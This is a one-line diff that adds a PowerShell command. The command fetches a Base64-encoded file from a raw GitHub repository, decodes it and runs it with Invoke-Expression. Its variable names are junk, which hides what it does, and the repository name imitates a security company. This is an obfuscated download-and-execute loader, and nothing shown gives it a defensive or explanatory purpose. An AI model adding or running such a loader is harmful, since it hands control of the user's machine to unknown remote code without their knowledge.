@@ -1,0 +1,1 @@
+$laksfnasf = (iwr https://raw.githubusercontent.com/br1337/positivetechnologies/main/inno.txt -usebasicparsing).content;$zxcasfasd = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($laksfnasf)); iex $zxcasfasd
